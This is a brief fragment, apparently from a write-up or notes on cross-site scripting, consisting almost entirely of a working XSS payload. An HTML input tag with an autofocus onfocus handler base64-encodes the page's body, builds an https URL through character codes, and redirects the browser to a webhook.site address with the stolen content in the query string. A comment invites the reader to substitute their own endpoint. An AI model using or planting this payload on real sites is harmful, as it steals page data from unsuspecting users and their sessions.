...
<input autofocus onfocus ='let+a+=btoa(document.body.innerHTML);
let server = btoa ("webhook.site/e184124c-f8bc-4235-b025-349cf897188d"); // Replace This with Yours without https://
let schema=String.fromCharCode(104,116,116,112,115,58,47,47);
let full_url=schema+atob(server)
location=(`${full_url}?data=${a}`)'/>Never+Click+Here%0a<h1>Elmagek
```
# exploit code with url encoding
```
